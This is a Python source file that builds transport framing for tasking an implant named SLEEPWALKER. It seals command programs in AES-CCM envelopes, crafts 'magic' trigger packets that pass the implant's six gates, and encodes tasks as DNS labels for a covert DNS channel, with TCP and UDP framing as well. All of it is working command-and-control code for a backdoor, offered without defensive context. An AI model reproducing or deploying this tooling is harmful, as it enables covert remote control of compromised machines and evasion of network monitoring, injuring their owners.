"""Transport framing for SLEEPWALKER task programs.

Produces byte-identical output to the implant's C builders:
  * main envelope   : nonce12 | tag16 | ct          (AES-256-CCM)
  * DNS envelope    : nonce7  | tag4  | ct
  * magic packet    : the six-gate trigger packet
  * DNS label       : marker | base32(env) | marker  (markers = CRC-8 of body)
"""

from __future__ import annotations

import os

from .core import (
    AES_KEY,
    DNS_NONCE_LEN,
    DNS_TAG_LEN,
    MAGIC_MAX_BLOCK,
    NONCE_LEN,
    SNIFF_MIN_PACKET,
    SNIFF_XOR_CONST,
    TAG_LEN,
    base32_encode,
    ccm_seal,
    crc32,
    crc8,
)


def seal_task(program: bytes, nonce: bytes | None = None) -> bytes:
    """Main envelope: nonce12 | tag16 | ct."""
    if nonce is None:
        nonce = os.urandom(NONCE_LEN)
    ct, tag = ccm_seal(nonce, program, TAG_LEN)
    return nonce + tag + ct


def seal_dns(program: bytes, nonce: bytes | None = None) -> bytes:
    """DNS-channel envelope: nonce7 | tag4 | ct."""
    if nonce is None:
        nonce = os.urandom(DNS_NONCE_LEN)
    ct, tag = ccm_seal(nonce, program, DNS_TAG_LEN)
    return nonce + tag + ct


def build_magic_packet(program: bytes) -> bytes:
    """Build a 48+-byte magic packet that passes all six gates.

    Mirrors sw_magic_packet_build.  Layout (P = packet length):
      [ prefix ][ block B bytes ]
      block = [ SUM(2) ][ env(28+pt) ][ crc(4) ][ w1(2) ][ w2(2) ]
    """
    env = seal_task(program)
    env_len = len(env)
    B = env_len + 10
    if B > MAGIC_MAX_BLOCK:
        raise ValueError("task program too large for a magic packet")
    w1 = (B ^ SNIFF_XOR_CONST) & 0xFFFF
    w2 = 0
    summ = (w1 + w2) & 0xFFFF
    body = summ.to_bytes(2, "big") + env + w1.to_bytes(2, "big") + w2.to_bytes(2, "big")
    crc = crc32(body, 0)
    block = (
        summ.to_bytes(2, "big")
        + env
        + crc.to_bytes(4, "big")
        + w1.to_bytes(2, "big")
        + w2.to_bytes(2, "big")
    )
    need = max(0, SNIFF_MIN_PACKET - B)
    return b"\x00" * need + block


def dns_label(program: bytes) -> str:
    """Encode a task program as a single DNS label (markers from CRC-8)."""
    env = seal_dns(program)
    mid = base32_encode(env)
    crc = crc8(mid.encode("ascii"))
    return chr(ord("g") + (crc >> 4)) + mid + chr(ord("g") + (crc & 0x0F))


def dns_qname(program: bytes, suffix: str = "example.com") -> str:
    return dns_label(program) + "." + suffix


def tcp_frame(program: bytes) -> bytes:
    """Stream transport: 2-byte BE envelope length + main envelope."""
    env = seal_task(program)
    return len(env).to_bytes(2, "big") + env


def udp_datagram(program: bytes) -> bytes:
    """UDP transport: the main envelope is the datagram."""
    return seal_task(program)
